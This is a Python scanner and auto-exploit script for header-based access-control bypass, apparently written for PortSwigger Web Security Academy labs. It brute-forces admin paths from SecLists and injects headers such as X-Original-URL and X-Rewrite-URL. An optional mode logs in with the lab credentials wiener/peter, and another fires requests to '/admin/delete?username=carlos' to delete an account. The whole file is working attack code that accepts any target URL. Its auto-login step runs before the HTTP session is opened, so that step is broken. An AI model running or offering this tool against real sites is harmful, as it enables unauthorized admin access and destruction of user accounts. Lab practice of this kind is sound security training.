#!/usr/bin/env python3
"""
x_override_full_exploit.py

Full scanner + optional automatic exploit for PortSwigger-like labs.
- SecLists-based optimized brute forcing (Discovery/Web-Content)
- Header override testing (X-Original-URL, X-Rewrite-URL, ...)
- GET/POST support and optional automatic login (wiener/peter) for labs
- --auto-exploit will attempt to trigger /admin/delete?username=carlos (GET/POST forms)
- Output: JSON/CSV, colored terminal

Usage example:
  python3 x_override_full_exploit.py -u 0a90006204c026ba804abc79007b00c4.web-security-academy.net --deep --follow --concurrency 8 --auto-exploit --output findings.json
"""

import argparse
import asyncio
import aiohttp
import ssl
import certifi
from aiohttp import ClientConnectorError, ClientResponseError, ClientSSLError, ClientOSError, ClientTimeout
from urllib.parse import urljoin, urlparse
from pathlib import Path
import os
import json
import csv
import hashlib
import time
import re
import sys

# ---------------- Config ----------------
SECLISTS_BASE_CANDIDATES = [
    "/usr/share/seclists",
    "/usr/share/wordlists/seclists",
    "/opt/seclists",
    "/root/SecLists",
    str(Path.home() / "SecLists"),
]

SECLISTS_DISCOVERY_DIR = "Discovery/Web-Content"

# Relative lists to consider (we will scan entire Discovery/Web-Content and filter)
ADMIN_KEYWORDS = ["admin","panel","dashboard","manage","root","secure","private","console","login","administrator","adminer"]

HEADER_VARIANTS = [
    "X-Original-URL","X-Original-Url","X-Original-URI","X-Original-Uri",
    "X-Rewrite-URL","X-Rewrite-Url","X-Override-URL",
    "X-Forwarded-Host","X-Forwarded-For","X-Forwarded-Proto",
    "X-HTTP-Method-Override","X-Requested-With"
]

DEFAULT_OVERRIDE_TARGETS = ["/admin","/admin/delete","/admin/delete?username=test"]

SNIPPET_LEN = 300

# Terminal colors
GREEN = "\033[92m"; YELLOW = "\033[93m"; RED = "\033[91m"; CYAN = "\033[96m"; RESET = "\033[0m"

# ---------------- Helpers ----------------

def find_seclists_root():
    for p in SECLISTS_BASE_CANDIDATES:
        if os.path.isdir(p):
            # prefer candidate that actually contains Discovery/Web-Content
            if os.path.isdir(os.path.join(p, SECLISTS_DISCOVERY_DIR)):
                return os.path.join(p, SECLISTS_DISCOVERY_DIR)
            return p
    return None

def normalize_path(p):
    if not p:
        return None
    p = p.strip()
    if p == "" or p.startswith("#"):
        return None
    # remove URL scheme/host if present
    if "://" in p:
        try:
            parsed = urlparse(p)
            p = parsed.path or "/"
            if parsed.query:
                p += "?" + parsed.query
        except:
            pass
    # replace backslashes, collapse multiple slashes
    p = p.replace("\\","/")
    p = re.sub(r"/+", "/", p)
    if not p.startswith("/"):
        p = "/" + p
    # remove trailing slash except root
    if p != "/" and p.endswith("/"):
        p = p.rstrip("/")
    return p

def snippet(text, n=SNIPPET_LEN):
    if not text:
        return ""
    s = text.replace("\r"," ").replace("\n"," ")
    return s[:n]

def sha256_text(text):
    if not text:
        return ""
    return hashlib.sha256(text.encode("utf-8", errors="ignore")).hexdigest()

# ---------------- Load SecLists (optimized filter) ----------------
def load_admin_paths_from_seclists(discovery_dir, optimize_filter=True):
    paths = []
    if not discovery_dir or not os.path.isdir(discovery_dir):
        return paths
    # read all files in directory
    for root, dirs, files in os.walk(discovery_dir):
        for fname in files:
            full = os.path.join(root, fname)
            try:
                with open(full, "r", errors="ignore") as fh:
                    for line in fh:
                        line = line.strip()
                        if not line or line.startswith("#"):
                            continue
                        # if optimize_filter, only keep lines containing admin keywords
                        low = line.lower()
                        if optimize_filter:
                            if not any(k in low for k in ADMIN_KEYWORDS):
                                continue
                        n = normalize_path(line)
                        if n:
                            paths.append(n)
            except Exception:
                continue
    # deduplicate preserving order
    seen = set()
    out = []
    for p in paths:
        if p not in seen:
            seen.add(p)
            out.append(p)
    return out

# ---------------- Async HTTP utilities ----------------
async def fetch(session, method, url, headers=None, data=None, allow_redirects=False):
    try:
        async with session.request(method, url, headers=headers, data=data, allow_redirects=allow_redirects) as resp:
            text = await resp.text(errors="ignore")
            return {
                "status": resp.status,
                "headers": dict(resp.headers),
                "text": text,
                "len": len(text.encode("utf-8", errors="ignore")),
                "url": str(resp.url)
            }
    except (ClientConnectorError, ClientResponseError, ClientSSLError, ClientOSError) as e:
        return {"status": None, "headers": {}, "text": f"ERROR: {e}", "len": 0, "url": url}
    except asyncio.TimeoutError:
        return {"status": None, "headers": {}, "text": "ERROR: TIMEOUT", "len": 0, "url": url}
    except Exception as e:
        return {"status": None, "headers": {}, "text": f"ERROR: {e}", "len": 0, "url": url}

async def follow_chain(session, method, url, headers=None, data=None, max_hops=6, rate_limit=0.0):
    chain = []
    cur = url
    for i in range(max_hops):
        r = await fetch(session, method, cur, headers=headers, data=data, allow_redirects=False)
        chain.append(r)
        status = r.get("status")
        if not status or status < 300 or status >= 400:
            break
        loc = r.get("headers", {}).get("Location")
        if not loc:
            break
        cur = urljoin(cur, loc)
        if rate_limit:
            await asyncio.sleep(rate_limit)
    return chain

def chain_summary(chain):
    if not chain:
        return ""
    return " -> ".join([f"{c.get('status')}:{urlparse(c.get('url')).path or '/'}" for c in chain])

def is_interesting(baseline, candidate, baseline_chain=None, cand_chain=None, threshold=0.10):
    reasons = []
    severity = "LOW"
    if candidate is None or candidate.get("status") is None:
        return False, reasons, severity

    if baseline is None or baseline.get("status") is None:
        reasons.append("no baseline but candidate responded")
        severity = "MEDIUM"
        return True, reasons, severity

    b = baseline.get("status"); c = candidate.get("status")
    if b != c:
        reasons.append(f"status changed {b} -> {c}")
        if b in (401,403,404) and c in (200,301,302):
            severity = "HIGH"
        else:
            severity = max_severity(severity, "MEDIUM")

    b_loc = baseline.get("headers", {}).get("Location")
    c_loc = candidate.get("headers", {}).get("Location")
    if b_loc != c_loc:
        reasons.append(f"Location changed: {b_loc} -> {c_loc}")
        severity = max_severity(severity, "HIGH")

    b_len = baseline.get("len", 0)
    c_len = candidate.get("len", 0)
    if b_len == 0 and c_len > 50:
        reasons.append(f"body len was 0 now {c_len}")
        severity = max_severity(severity, "MEDIUM")
    elif b_len > 0:
        diff = abs(b_len - c_len) / b_len
        if diff > threshold:
            reasons.append(f"body length changed by {diff:.2%} ({b_len}->{c_len})")
            severity = max_severity(severity, "MEDIUM")

    lower_text = (candidate.get("text","") or "").lower()
    if any(k in lower_text for k in ADMIN_KEYWORDS):
        reasons.append("admin keywords found in response")
        severity = max_severity(severity, "HIGH")

    if baseline_chain and cand_chain:
        if chain_summary(baseline_chain) != chain_summary(cand_chain):
            reasons.append(f"redirect chain differs")
            severity = max_severity(severity, "MEDIUM")

    if baseline and baseline.get("status") == 403 and candidate.get("status") in (200,301,302):
        reasons.append("baseline 403 but candidate returned success (403 special)")
        severity = "HIGH"

    return (len(reasons) > 0), reasons, severity

def max_severity(cur, new):
    order = {"LOW":0,"MEDIUM":1,"HIGH":2}
    return cur if order[cur] >= order[new] else new

# ---------------- Scanner Class ----------------
class XOverrideScanner:
    def __init__(self, base, concurrency=10, timeout=8, insecure=False, follow=False, deep=False,
                 post_data=None, cookie=None, rate_limit=0.0, output=None, csv=None, auto_exploit=False, auto_login=False):
        self.base = base.rstrip("/")
        self.concurrency = concurrency
        self.timeout = timeout
        self.insecure = insecure
        self.follow = follow
        self.deep = deep
        self.post_data = post_data
        self.cookie = cookie
        self.rate_limit = rate_limit
        self.output = output
        self.csv = csv
        self.auto_exploit = auto_exploit
        self.auto_login = auto_login

        self.override_paths = list(DEFAULT_OVERRIDE_TARGETS)
        self.semaphore = asyncio.Semaphore(concurrency)
        self.findings = []

        self.session = None

    async def __aenter__(self):
        # ssl context
        if self.insecure:
            sslcontext = False
        else:
            ctx = ssl.create_default_context(cafile=certifi.where())
            sslcontext = ctx
        timeout = ClientTimeout(total=self.timeout)
        connector = aiohttp.TCPConnector(ssl=sslcontext, limit=0)
        self.session = aiohttp.ClientSession(connector=connector, timeout=timeout, trust_env=True)
        return self

    async def __aexit__(self, exc_type, exc, tb):
        if self.session:
            await self.session.close()

    async def prepare_override_paths(self):
        if self.deep:
            seclists_root = find_seclists_root()
            if not seclists_root:
                print(f"{RED}[!] --deep requested but SecLists not found. Disable --deep or install SecLists.{RESET}")
                return
            discovery = os.path.join(seclists_root, SECLISTS_DISCOVERY_DIR) if os.path.basename(seclists_root) != "Discovery" else seclists_root
            if not os.path.isdir(discovery):
                # if find_seclists_root already returned the full Discovery/Web-Content path, handle it
                discovery = seclists_root if os.path.isdir(seclists_root) else discovery
            loaded = load_admin_paths_from_seclists(discovery, optimize_filter=True)
            # extend override paths with loaded ones
            for p in loaded:
                if p not in self.override_paths:
                    self.override_paths.append(p)
            print(f"{CYAN}[i] Loaded {len(loaded)} override candidates from SecLists (optimized).{RESET}")

    async def auto_login_if_requested(self):
        # Attempt PortSwigger lab default login if requested and post_data not provided
        if not self.auto_login:
            return None
        login_path = "/login"
        login_url = urljoin(self.base, login_path)
        print(f"{CYAN}[i] Attempting automatic login to {login_url}{RESET}")
        # fetch login page for CSRF token if present
        r = await fetch(self.session, "GET", login_url, headers=({"Cookie": self.cookie} if self.cookie else None), data=None)
        # try to parse CSRF token as common input name
        token = None
        if r and r.get("text"):
            # naive regex extraction for hidden input named csrf or token
            m = re.search(r'name=["\']?(?:csrf|token|_csrf|authenticity_token)["\']?\s+value=["\']([^"\']+)["\']', r.get("text"), re.I)
            if m:
                token = m.group(1)
        # build post data - default for labs
        pdata = None
        if self.post_data:
            pdata = self.post_data
        else:
            # use lab defaults
            params = {"username":"wiener","password":"peter"}
            if token:
                # try common param names
                params["csrf"] = token
            # build urlencoded
            pdata = "&".join([f"{k}={v}" for k,v in params.items()])
        # perform login POST
        post_resp = await fetch(self.session, "POST", login_url, headers=({"Cookie": self.cookie} if self.cookie else None), data=pdata)
        if post_resp and post_resp.get("status") in (200,302,301):
            print(f"{GREEN}[+] Auto-login seemed to respond with {post_resp.get('status')}{RESET}")
            # store cookie jar from session is automatic in aiohttp client session
            return True
        print(f"{YELLOW}[!] Auto-login did not clearly succeed (status {post_resp.get('status') if post_resp else 'N/A'}){RESET}")
        return False

    async def analyze_baseline(self, path):
        target = urljoin(self.base, path.lstrip("/"))
        headers = {}
        if self.cookie:
            headers["Cookie"] = self.cookie
        # GET baseline
        base_get = await fetch(self.session, "GET", target, headers=headers, data=None, allow_redirects=False)
        base_get_chain = []
        if self.follow:
            base_get_chain = await follow_chain(self.session, "GET", target, headers=headers, data=None, max_hops=6, rate_limit=self.rate_limit)
        base_post = None
        base_post_chain = []
        if self.post_data:
            base_post = await fetch(self.session, "POST", target, headers=headers, data=self.post_data, allow_redirects=False)
            if self.follow:
                base_post_chain = await follow_chain(self.session, "POST", target, headers=headers, data=self.post_data, max_hops=6, rate_limit=self.rate_limit)
        return (base_get, base_get_chain, base_post, base_post_chain)

    async def test_override_combo(self, path, header, override, method, baseline_resp, baseline_chain):
        # construct headers
        headers = {}
        if self.cookie:
            headers["Cookie"] = self.cookie
        headers[header] = override
        target = urljoin(self.base, path.lstrip("/"))
        # use semaphore for concurrency
        async with self.semaphore:
            if method == "GET":
                if self.follow:
                    cand_chain = await follow_chain(self.session, "GET", target, headers=headers, data=None, max_hops=6, rate_limit=self.rate_limit)
                    candidate = cand_chain[-1] if cand_chain else None
                else:
                    candidate = await fetch(self.session, "GET", target, headers=headers, data=None)
                    cand_chain = []
            else:
                if self.follow:
                    cand_chain = await follow_chain(self.session, "POST", target, headers=headers, data=self.post_data, max_hops=6, rate_limit=self.rate_limit)
                    candidate = cand_chain[-1] if cand_chain else None
                else:
                    candidate = await fetch(self.session, "POST", target, headers=headers, data=self.post_data)
                    cand_chain = []
            return candidate, cand_chain

    async def run_for_path(self, path):
        # prepare baseline
        base_get, base_get_chain, base_post, base_post_chain = await self.analyze_baseline(path)
        # try override combinations
        for header in HEADER_VARIANTS:
            for override in self.override_paths:
                # methods to try
                methods = [("GET", base_get, base_get_chain)]
                if self.post_data is not None:
                    methods.append(("POST", base_post, base_post_chain))
                for method_name, baseline_resp, baseline_chain in methods:
                    candidate, cand_chain = await self.test_override_combo(path, header, override, method_name, baseline_resp, baseline_chain)
                    # logging
                    cand_status = candidate.get("status") if candidate else None
                    cand_len = candidate.get("len") if candidate else 0
                    print(f"[{header}] {method_name} -> {override} => {cand_status} | len={cand_len} | url={candidate.get('url') if candidate else 'N/A'}")
                    interesting, reasons, severity = is_interesting(baseline_resp, candidate, baseline_chain, cand_chain)
                    if interesting:
                        record = {
                            "path_tested": path,
                            "header": header,
                            "method": method_name,
                            "override": override,
                            "severity": severity,
                            "reasons": reasons,
                            "baseline_status": baseline_resp.get("status") if baseline_resp else None,
                            "candidate_status": candidate.get("status") if candidate else None,
                            "candidate_len": cand_len,
                            "candidate_url": candidate.get("url") if candidate else None,
                            "candidate_snippet": snippet(candidate.get("text","")) if candidate else ""
                        }
                        self.findings.append(record)
                        # If auto_exploit and HIGH severity, attempt exploit
                        if self.auto_exploit and severity == "HIGH":
                            await self.attempt_auto_exploit(record)

    async def attempt_auto_exploit(self, finding):
        """
        Try to auto-trigger deletion of carlos by using known delete endpoints
        via the found header/override combination. This tries both GET and POST.
        Only for labs/authorized targets.
        """
        header = finding["header"]
        override = finding["override"]
        path = finding["path_tested"]
        print(f"{YELLOW}[i] Auto-exploit: trying delete payloads for {header} -> {override}{RESET}")
        delete_candidates = [
            "/admin/delete?username=carlos",
            "/admin/delete?username=test",
            "/admin/delete?user=carlos",
            "/admin/delete?username=carlos&confirm=1",
            "/admin/delete",
            "/admin/remove?username=carlos",
            "/admin/deleteUser?username=carlos",
            "/admin/delete?username=carlos"  # duplicate safe
        ]
        # try each delete endpoint as override value
        for d in delete_candidates:
            hdrs = {}
            if self.cookie:
                hdrs["Cookie"] = self.cookie
            hdrs[header] = d
            target = urljoin(self.base, path.lstrip("/"))
            # Try GET
            try:
                rget = await fetch(self.session, "GET", target, headers=hdrs, data=None)
                print(f"    [Exploit GET] override {d} => status {rget.get('status') if rget else 'N/A'} len={rget.get('len') if rget else 0}")
                # Heuristic success if redirect to /admin or 200 with admin keywords or 302 to admin
                if rget and (rget.get("status") in (200,302,301) and any(k in (rget.get("text","") or "").lower() for k in ["user deleted","deleted","success","carlos"])):
                    print(f"{GREEN}[+] Exploit likely succeeded via GET override {d}{RESET}")
                    return
            except Exception:
                pass
            # Try POST (some endpoints expect POST)
            try:
                rpost = await fetch(self.session, "POST", target, headers=hdrs, data=self.post_data or "")
                print(f"    [Exploit POST] override {d} => status {rpost.get('status') if rpost else 'N/A'} len={rpost.get('len') if rpost else 0}")
                if rpost and (rpost.get("status") in (200,302,301) and any(k in (rpost.get("text","") or "").lower() for k in ["user deleted","deleted","success","carlos"])):
                    print(f"{GREEN}[+] Exploit likely succeeded via POST override {d}{RESET}")
                    return
            except Exception:
                pass
        print(f"{YELLOW}[!] Auto-exploit attempts finished for this finding (no clear success signal).{RESET}")

# ---------------- Runner ----------------

async def main_async(args):
    # normalize base
    base = args.url
    if not (base.startswith("http://") or base.startswith("https://")):
        base = "https://" + base
    # prepare scanner
    scanner = XOverrideScanner(base=base,
                               concurrency=args.concurrency,
                               timeout=args.timeout,
                               insecure=args.insecure,
                               follow=args.follow,
                               deep=args.deep,
                               post_data=args.post_data,
                               cookie=args.cookie,
                               rate_limit=args.rate_limit,
                               output=args.output,
                               csv=args.csv,
                               auto_exploit=args.auto_exploit,
                               auto_login=args.auto_login)
    # prepare override paths
    await scanner.prepare_override_paths()
    # if auto_login was requested, attempt login to obtain session cookies before testing
    if scanner.auto_login:
        await scanner.auto_login_if_requested()
    # baseline paths to try
    baseline_paths = ["/","/login","/index","/home"]
    if args.path:
        baseline_paths = [args.path if args.path.startswith("/") else "/"+args.path]
    tasks = []
    async with scanner:
        for p in baseline_paths:
            tasks.append(scanner.run_for_path(p))
        # run tasks, handle rate limiting by semaphore built-in
        await asyncio.gather(*tasks)
    # save results
    if scanner.output:
        try:
            with open(scanner.output, "w") as fh:
                json.dump(scanner.findings, fh, indent=2)
            print(f"{GREEN}[+] Saved JSON to {scanner.output}{RESET}")
        except Exception as e:
            print(f"{RED}[!] Could not save JSON: {e}{RESET}")
    if scanner.csv:
        try:
            with open(scanner.csv, "w", newline="") as csvf:
                writer = csv.writer(csvf)
                writer.writerow(["path_tested","header","method","override","severity","reasons","baseline_status","candidate_status","candidate_len","candidate_url"])
                for r in scanner.findings:
                    writer.writerow([r.get(k) for k in ("path_tested","header","method","override","severity","reasons","baseline_status","candidate_status","candidate_len","candidate_url")])
            print(f"{GREEN}[+] Saved CSV to {scanner.csv}{RESET}")
        except Exception as e:
            print(f"{RED}[!] Could not save CSV: {e}{RESET}")
    return scanner.findings

def parse_args():
    p = argparse.ArgumentParser(description="X-Override full scanner + SecLists optimized brute-force + optional auto-exploit (authorized targets only)")
    p.add_argument("-u","--url", required=True, help="Target host or base URL (e.g. example.com or https://example.com)")
    p.add_argument("--path", help="Single baseline path (e.g. /login)")
    p.add_argument("--post-data", help="POST body to send for POST checks (enables POST path checks)")
    p.add_argument("--cookie", help="Cookie header value to include")
    p.add_argument("--concurrency", type=int, default=10, help="Concurrency (default 10)")
    p.add_argument("--timeout", type=int, default=8, help="Request timeout seconds (default 8)")
    p.add_argument("--insecure", action="store_true", help="Do not verify TLS")
    p.add_argument("--follow", action="store_true", help="Follow redirect chains")
    p.add_argument("--deep", action="store_true", help="Use SecLists optimized admin path discovery")
    p.add_argument("--output", help="Save findings to JSON")
    p.add_argument("--csv", help="Save findings to CSV")
    p.add_argument("--rate-limit", type=float, default=0.0, help="Delay between requests (seconds)")
    p.add_argument("--auto-exploit", action="store_true", help="Attempt automatic exploit (delete carlos) on HIGH findings")
    p.add_argument("--auto-login", action="store_true", help="Attempt automatic login with default lab creds (wiener/peter) before testing")
    return p.parse_args()

def main():
    args = parse_args()
    try:
        findings = asyncio.run(main_async(args))
        print(f"{GREEN}[+] Scan complete. {len(findings)} finding(s).{RESET}")
        if findings:
            for f in findings:
                sevcol = GREEN if f["severity"]=="LOW" else (YELLOW if f["severity"]=="MEDIUM" else RED)
                print(f"{sevcol}[{f['severity']}] {f['header']} {f['method']} -> {f['override']} on {f['path_tested']}{RESET}")
                for r in f['reasons']:
                    print(f"   - {r}")
    except KeyboardInterrupt:
        print(f"{YELLOW}[!] Interrupted by user{RESET}")
    except Exception as e:
        print(f"{RED}[!] Fatal: {e}{RESET}")

if __name__ == "__main__":
    main()
